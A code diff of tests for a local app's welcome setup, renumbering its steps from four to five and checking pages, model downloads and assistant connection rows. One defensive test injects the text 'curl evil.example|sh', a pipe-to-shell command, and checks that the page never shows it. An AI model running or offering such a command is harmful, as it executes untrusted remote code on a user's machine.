@@ -145,15 +145,15 @@ test('a new Mac install opens on the welcome, and once it is done it never comes
   assert.match(w1.body, /Your brain is running/);
   assert.match(w1.body, /action="\/welcome\/name"/);
   const named = await post(app.baseUrl, '/welcome/name', home.cookie, { name: 'Alex' });
-  assert.equal(named.headers.get('location'), '/welcome?step=2');
+  assert.equal(named.headers.get('location'), '/welcome?step=2', 'the name leads to Your apps');
   assert.deepEqual(app.deps.service.loadProfile().map((m) => m.content), ['The owner is called Alex.']);
   // An empty name saves nothing.
   await post(app.baseUrl, '/welcome/name', home.cookie, { name: '  ' });
   assert.equal(app.deps.service.loadProfile().length, 1);
-  const w2 = await openPage(app.baseUrl, '/welcome?step=3', home.cookie);
+  const w2 = await openPage(app.baseUrl, '/welcome?step=4', home.cookie);
   assert.match(w2.body, /Claude Code/);
   assert.match(w2.body, /<input type="hidden" name="back" value="welcome">/, 'Connect returns to the welcome');
-  const w3 = await openPage(app.baseUrl, '/welcome?step=4', home.cookie);
+  const w3 = await openPage(app.baseUrl, '/welcome?step=5', home.cookie);
   assert.match(w3.body, /No assistant is added yet\./);
   const done = await post(app.baseUrl, '/welcome/done', home.cookie);
   assert.equal(done.headers.get('location'), '/');
@@ -184,7 +184,7 @@ test('the welcome does not interrupt a brain in use, and never exists outside lo
 test('another site cannot make the Tools page or the welcome say anything: only the last real result shows', async (t) => {
   const { app } = await start(t);
   const s = await openPage(app.baseUrl, '/settings');
-  for (const path of ['/settings/tools?said=BrainAI+needs+you+to+run+curl+evil.example%7Csh', '/settings/tools?tool=codex', '/welcome?step=3&said=Run+this+command']) {
+  for (const path of ['/settings/tools?said=BrainAI+needs+you+to+run+curl+evil.example%7Csh', '/settings/tools?tool=codex', '/welcome?step=4&said=Run+this+command']) {
     const p = await openPage(app.baseUrl, path, s.cookie);
     assert.doesNotMatch(p.body, /curl evil|Run this command|role="status"/, path);
   }
@@ -304,14 +304,14 @@ test('step 3 says the saved brain is back after a restore, once', async (t) => {
   mkdirSync(dataDir, { recursive: true });
   const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
   writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 12, pages: 3 }));
-  const p = await openPage(app.baseUrl, '/welcome?step=3', cookie);
+  const p = await openPage(app.baseUrl, '/welcome?step=4', cookie);
   assert.match(p.body, /Your saved brain is back: 12 facts and 3 pages\./);
   assert.ok(!existsSync(join(dataDir, 'restored.json')));
-  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /saved brain is back/);
+  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=4', cookie)).body, /saved brain is back/);
   writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ refused: 'This brain already has memories, so the saved copy was not brought in.' }));
-  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /already has memories/);
+  assert.match((await openPage(app.baseUrl, '/welcome?step=4', cookie)).body, /already has memories/);
   writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 1, pages: 1 }));
-  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /Your saved brain is back: 1 fact and 1 page\./);
+  assert.match((await openPage(app.baseUrl, '/welcome?step=4', cookie)).body, /Your saved brain is back: 1 fact and 1 page\./);
 });
 
 test('step 3 says how many pictures a backup file could not bring, only when some were missing', async (t) => {
@@ -320,9 +320,9 @@ test('step 3 says how many pictures a backup file could not bring, only when som
   mkdirSync(dataDir, { recursive: true });
   const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
   writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 2, pages: 1, pictures_missing: 3 }));
-  assert.match((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /3 pictures were not in the backup file: their pages kept their text\./);
+  assert.match((await openPage(app.baseUrl, '/welcome?step=4', cookie)).body, /3 pictures were not in the backup file: their pages kept their text\./);
   writeFileSync(join(dataDir, 'restored.json'), JSON.stringify({ at: '2026-11-12T10:00:00Z', facts: 2, pages: 1, pictures_missing: 0 }));
-  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=3', cookie)).body, /not in the backup file/);
+  assert.doesNotMatch((await openPage(app.baseUrl, '/welcome?step=4', cookie)).body, /not in the backup file/);
 });
 
 test('a successful Connect or Disconnect refreshes the ask commands at once, so the next session sees it', async (t) => {
@@ -388,33 +388,33 @@ async function withModels(t: TestContext, o: Parameters<typeof fakeModels>[0] = 
   return { ...s, ...fm, cookie };
 }
 
-test('step 1 leads to step 2 and says "Step 1 of 4"', async (t) => {
+test('step 1 leads to step 2 and says "Step 1 of 5"', async (t) => {
   const { app, cookie } = await withModels(t);
   const w1 = await openPage(app.baseUrl, '/welcome', cookie);
-  assert.match(w1.body, /Step 1 of 4/);
+  assert.match(w1.body, /Step 1 of 5/);
   assert.match(w1.body, /action="\/welcome\/name"/);
 });
 
-test('the welcome is a desktop setup: its own frame, the four steps with the current one marked and the earlier ones done, buttons in one row', async (t) => {
+test('the welcome is a desktop setup: its own frame, the five steps with the current one marked and the earlier ones done, buttons in one row', async (t) => {
   const { app, cookie } = await withModels(t);
-  const p = await openPage(app.baseUrl, '/welcome?step=3', cookie);
+  const p = await openPage(app.baseUrl, '/welcome?step=4', cookie);
   assert.match(p.body, /<body class="setup"/, 'not the phone-width sign-in layout');
   assert.doesNotMatch(p.body, /class="top solo"/, 'the brand lives in the step list');
   assert.match(p.body, /<ol class="setup-rail-steps" aria-label="Setup steps">/);
   assert.match(p.body, /<li class="done"><span class="step-mark"><svg[^]*?<\/svg><\/span><span>Your name<\/span><span class="visually-hidden"> \(done\)<\/span><\/li>/);
-  assert.match(p.body, /<li class="current" aria-current="step"><span class="step-mark">3<\/span><span>Connect<\/span><\/li>/);
-  assert.match(p.body, /<li class="todo"><span class="step-mark">4<\/span><span>Try it<\/span><\/li>/);
-  assert.match(p.body, /Step 3 of 4/, 'still said, for a narrow window and screen readers');
-  assert.match(p.body, /<p class="setup-actions"><a class="button primary" href="\/welcome\?step=4">Next<\/a><\/p>/);
+  assert.match(p.body, /<li class="current" aria-current="step"><span class="step-mark">4<\/span><span>Connect<\/span><\/li>/);
+  assert.match(p.body, /<li class="todo"><span class="step-mark">5<\/span><span>Try it<\/span><\/li>/);
+  assert.match(p.body, /Step 4 of 5/, 'still said, for a narrow window and screen readers');
+  assert.match(p.body, /<p class="setup-actions"><a class="button primary" href="\/welcome\?step=5">Next<\/a><\/p>/);
   // The ChatGPT note is one sentence around its link, not a wrapping row of pieces.
   assert.match(decodeEntities(p.body), /<span class="meta note">ChatGPT's app can't reach a brain/);
 });
 
-test('step 2 explains the two models, shows this computer and the recommended pair with size, licence and numbers', async (t) => {
+test('step 3 explains the two models, shows this computer and the recommended pair with size, licence and numbers', async (t) => {
   const { app, cookie } = await withModels(t);
-  const p = await openPage(app.baseUrl, '/welcome?step=2', cookie);
+  const p = await openPage(app.baseUrl, '/welcome?step=3', cookie);
   assert.equal(p.status, 200);
-  assert.match(p.body, /Step 2 of 4/);
+  assert.match(p.body, /Step 3 of 5/);
   assert.match(p.body, /<h1>How BrainAI finds things<\/h1>/);
   assert.match(p.body, /finds your memories by meaning/);
   assert.match(p.body, /finds your memories by meaning, in any language \(“the car charger” finds “EV wallbox”\)/);
@@ -433,8 +433,8 @@ test('step 2 explains the two models, shows this computer and the recommended pa
   assert.match(p.body, /found 150 of 168 first/);
   assert.match(p.body, /Prefer an online reranker\? Set it up later in Settings › Search\./);
   assert.doesNotMatch(p.body, /Through OpenRouter|type="radio"[^>]*disabled/);
-  assert.match(p.body, /<a href="\/welcome\?step=3">Skip for now\. Search works on keywords until you choose\.<\/a>/);
-  assert.match(p.body, /<a href="\/welcome\?step=1">‹ Back<\/a>/);
+  assert.match(p.body, /<a href="\/welcome\?step=4">Skip for now\. Search works on keywords until you choose\.<\/a>/);
+  assert.match(p.body, /<a href="\/welcome\?step=2">‹ Back<\/a>/);
   assert.doesNotMatch(p.body, /Strong/);
   assert.match(p.body, /Download 355 MB and continue/, 'Balanced + Standard');
   assert.match(p.body, /Choose the models myself<span class="chev"><\/span>/);
@@ -442,20 +442,20 @@ test('step 2 explains the two models, shows this computer and the recommended pa
 
 test('step 3 says Continue when the suggested models are already installed, and suggests Light + none on a small computer', async (t) => {
   const a = await withModels(t, { installed: ['gemma', 'mminilm'] });
-  assert.match((await openPage(a.app.baseUrl, '/welcome?step=2', a.cookie)).body, />Continue</);
+  assert.match((await openPage(a.app.baseUrl, '/welcome?step=3', a.cookie)).body, />Continue</);
   const b = await withModels(t, {}, { arch: 'x64', memoryBytes: 2 * GB });
-  const body = (await openPage(b.app.baseUrl, '/welcome?step=2', b.cookie)).body;
+  const body = (await openPage(b.app.baseUrl, '/welcome?step=3', b.cookie)).body;
   assert.match(body, /64-bit Intel\/AMD/);
   assert.match(body, /Download 135 MB and continue/);
 });
 
 test('step 2 headings never use "embedding", "cross-encoder" or "ONNX"', async (t) => {
   const { app, cookie } = await withModels(t);
-  for (const step of [1, 2, 3, 4]) {
+  for (const step of [1, 2, 3, 4, 5]) {
     const body = (await openPage(app.baseUrl, `/welcome?step=${step}`, cookie)).body;
     for (const h of body.match(/<h[1-3][^>]*>[\s\S]*?<\/h[1-3]>/g) ?? []) assert.doesNotMatch(h, /embedding|cross-encoder|onnx/i, h);
   }
-  const first = (await openPage(app.baseUrl, '/welcome?step=2', cookie)).body.match(/<h1>[\s\S]*?<\/h1>\s*<p[^>]*>([\s\S]*?)<\/p>/)![1]!;
+  const first = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body.match(/<h1>[\s\S]*?<\/h1>\s*<p[^>]*>([\s\S]*?)<\/p>/)![1]!;
   assert.doesNotMatch(first, /embedding|cross-encoder|onnx/i);
 });
 
@@ -463,13 +463,13 @@ test('posting "suggested" on a 16 GB Apple-silicon computer chooses Balanced + S
   const { app, cookie, chosen } = await withModels(t);
   const r = await post(app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' });
   assert.equal(r.status, 303);
-  assert.equal(r.headers.get('location'), '/welcome?step=3');
+  assert.equal(r.headers.get('location'), '/welcome?step=4');
   assert.deepEqual(chosen, [{ search: 'gemma', rerank: 'mminilm' }]);
 });
 
 test('posting a custom choice picks that pair; none means no reranker; Online and anything unknown are refused', async (t) => {
   const { app, cookie, chosen } = await withModels(t);
-  assert.equal((await post(app.baseUrl, '/welcome/models', cookie, { mode: 'custom', search: 'e5', rerank: 'none' })).headers.get('location'), '/welcome?step=3');
+  assert.equal((await post(app.baseUrl, '/welcome/models', cookie, { mode: 'custom', search: 'e5', rerank: 'none' })).headers.get('location'), '/welcome?step=4');
   assert.deepEqual(chosen, [{ search: 'e5', rerank: null }]);
   await post(app.baseUrl, '/welcome/models', cookie, { mode: 'custom', search: 'gemma', rerank: 'mminilm' });
   assert.deepEqual(chosen.at(-1), { search: 'gemma', rerank: 'mminilm' });
@@ -480,11 +480,11 @@ test('posting a custom choice picks that pair; none means no reranker; Online an
   assert.equal((await post(app.baseUrl, '/welcome/models', cookie, { mode: 'suggested' }, 'https://attacker.example')).status, 403);
 });
 
-test('step 3 shows the progress line, and the same line is on step 4', async (t) => {
+test('step 4 shows the progress line, and the same line is on step 5', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [
     { model: 'gemma', doneBytes: 64_000_000, totalBytes: 100_000_000, state: 'downloading' },
   ] } });
-  for (const step of [3, 4]) {
+  for (const step of [4, 5]) {
     const body = (await openPage(app.baseUrl, `/welcome?step=${step}`, cookie)).body;
     assert.match(body, /data-models-progress/);
     assert.match(body, /Downloading the search models… 64 of 100 MB · 64% — keyword search already works/);
@@ -493,14 +493,14 @@ test('step 3 shows the progress line, and the same line is on step 4', async (t)
 
 test('a failed download shows the plain problem and a link to Settings › Search', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: null }, progress: [], problem: 'no connection to the model server' } });
-  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=4', cookie)).body;
   assert.match(body, /no connection to the model server/);
   assert.match(body, /href="\/settings#search"/);
 });
 
 test('when only the reranker failed, the line says search by meaning works and names the reranker', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [], searchReady: true, problem: 'no connection to the model server', problemWith: 'rerank' } });
-  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=4', cookie)).body;
   assert.match(body, /Search by meaning works; the reranker \(Standard\) could not be set up: no connection to the model server\./);
   assert.doesNotMatch(body, /Keyword search still works|search models could not be set up/);
   assert.match(body, /href="\/settings#search"/);
@@ -508,14 +508,14 @@ test('when only the reranker failed, the line says search by meaning works and n
 
 test('when the search model failed, the line still says keyword search works', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: 'mminilm' }, progress: [], searchReady: false, problem: 'no connection to the model server', problemWith: 'search' } });
-  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=4', cookie)).body;
   assert.match(body, /The search models could not be set up: no connection to the model server\. Keyword search still works\./);
   assert.doesNotMatch(body, /Search by meaning works/);
 });
 
 test('when a newly chosen search model failed but the earlier one serves, the line says search by meaning still works', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'e5', rerank: 'mminilm' }, progress: [], searchReady: true, problem: 'no connection to the model server', problemWith: 'search' } });
-  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=4', cookie)).body;
   assert.match(body, /Search by meaning works with the model you had; Light could not be set up: no connection to the model server\./);
   assert.doesNotMatch(body, /Keyword search still works|search models could not be set up/);
   assert.match(body, /href="\/settings#search"/);
@@ -565,7 +565,7 @@ test('on Windows step 2 says "this computer", never "this Mac", and names the 64
   const app = await startTestApp({ localMode: true, noPassword: true, statusDir, models: fm.manager, hardware: async () => computer({ arch: 'x64', platform: 'win32' }), tools: { platform: 'win32', home: f.home, path: f.bin, apps: f.apps } });
   t.after(() => app.close());
   const cookie = (await openPage(app.baseUrl, '/settings')).cookie;
-  const body = (await openPage(app.baseUrl, '/welcome?step=2', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
   assert.match(body, /this computer/);
   assert.doesNotMatch(body, /this Mac/);
   assert.match(body, /64-bit Intel\/AMD/);
@@ -607,7 +607,7 @@ test('posting "suggested" twice quickly starts one download only', async (t) => 
 
 test('the progress line shows a re-read when nothing is downloading, and the page polls', async (t) => {
   const { app, cookie } = await withModels(t, { status: { choice: { search: 'gemma', rerank: null }, progress: [], searchReady: false, rereading: true } });
-  const body = (await openPage(app.baseUrl, '/welcome?step=3', cookie)).body;
+  const body = (await openPage(app.baseUrl, '/welcome?step=4', cookie)).body;
   assert.match(body, /Re-reading your memories with the new search model… keyword search works meanwhile/);
   assert.match(body, /data-busy/);
   const j = await (await fetch(app.baseUrl + '/models/progress', { headers: { Cookie: cookie } })).json() as { busy: boolean; line: string };
@@ -914,7 +914,7 @@ async function startWith(t: TestContext, tools: { platform?: NodeJS.Platform; cl
 test("Claude's desktop app has a Connect row in Settings and the welcome when it is installed, and connects with its own key", async (t) => {
   const { app, f } = await startWith(t, { claude: true });
   const s = await openPage(app.baseUrl, '/settings');
-  for (const path of ['/settings/tools', '/welcome?step=3']) {
+  for (const path of ['/settings/tools', '/welcome?step=4']) {
     const body = (await openPage(app.baseUrl, path, s.cookie)).body;
     assert.match(body, /Claude \(desktop app\)/, path);
     assert.match(body, /action="\/settings\/tools\/claude-desktop\/connect"/, path);
@@ -941,7 +941,7 @@ test('the ChatGPT row says what its app can reach, has no Connect button, and di
   for (const [platform, extra] of [['darwin', 'Turn on Reach from phone and web, then add BrainAI in ChatGPT on the web.'], ['win32', 'Put BrainAI on a server to use it from ChatGPT.']] as const) {
     const { app } = await startWith(t, { platform });
     const s = await openPage(app.baseUrl, '/settings');
-    for (const path of ['/settings/tools', '/welcome?step=3']) {
+    for (const path of ['/settings/tools', '/welcome?step=4']) {
       const body = decodeEntities((await openPage(app.baseUrl, path, s.cookie)).body).replace(/<[^>]+>/g, '');
       assert.match(body, /ChatGPT/, `${platform} ${path}`);
       assert.ok(body.includes(CHATGPT), `${platform} ${path}`);
@@ -956,7 +956,7 @@ test('on a server neither the Claude (desktop app) nor the ChatGPT row exists, a
   const server = await startTestApp({ localMode: false });
   t.after(() => server.close());
   const as = await loggedIn(server);
-  for (const path of ['/settings', '/settings/tools', '/welcome?step=3']) {
+  for (const path of ['/settings', '/settings/tools', '/welcome?step=4']) {
     const res = await as(path);
     const body = res.status === 200 ? await res.text() : '';
     if (path === '/settings') assert.equal(res.status, 200);
@@ -1012,7 +1012,7 @@ test('the Tools page keeps its lede true for the new rows, and ChatGPT points at
   for (const [platform, link] of [['darwin', '/settings/reach'], ['win32', '/settings/move']] as const) {
     const { app } = await startWith(t, { platform, claude: true });
     const s = await openPage(app.baseUrl, '/settings');
-    for (const path of ['/settings/tools', '/welcome?step=3']) {
+    for (const path of ['/settings/tools', '/welcome?step=4']) {
       const body = (await openPage(app.baseUrl, path, s.cookie)).body;
       assert.doesNotMatch(body, /Each tool (then )?signs in once/, path);
       assert.match(body, /uit Claude completely/, `${path}: Claude's own note`);
@@ -1122,11 +1122,11 @@ test('the welcome has Back on steps 2 to 4, a skip on the search step, and no di
 test('welcome step 4 has a Copy button, a hidden sign-in hint for the added tool, and says so when no tool is added', async (t) => {
   const { app } = await start(t);
   const home = await openPage(app.baseUrl, '/');
-  const none = (await openPage(app.baseUrl, '/welcome?step=4', home.cookie)).body;
-  assert.match(none, /No assistant is added yet\. <a href="\/welcome\?step=3">Go back and connect one<\/a>, or open your brain and do it later\./);
+  const none = (await openPage(app.baseUrl, '/welcome?step=5', home.cookie)).body;
+  assert.match(none, /No assistant is added yet\. <a href="\/welcome\?step=4">Go back and connect one<\/a>, or open your brain and do it later\./);
   assert.doesNotMatch(none, /data-setup-status|Waiting for your first memory/);
   await post(app.baseUrl, '/settings/tools/claude-code/connect', home.cookie, { back: 'welcome' });
-  const four = (await openPage(app.baseUrl, '/welcome?step=4', home.cookie)).body;
+  const four = (await openPage(app.baseUrl, '/welcome?step=5', home.cookie)).body;
   assert.match(four, /data-copy="Save a note in BrainAI that I set it up today\."/);
   assert.match(four, /data-nothing-yet hidden>Nothing yet\? Check that the tool signed in\. In Claude Code: \/mcp › brainai › Authenticate\./);
   assert.match(four, /data-setup-status="\/welcome\/first"/);
